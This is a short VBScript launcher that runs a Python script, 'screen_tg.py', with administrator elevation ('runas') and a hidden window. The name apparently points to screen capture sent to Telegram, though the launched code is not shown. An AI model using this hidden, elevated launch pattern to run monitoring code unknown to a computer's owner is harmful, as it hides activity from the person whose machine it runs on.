Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "python", "screen_tg.py", CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName), "runas", 0
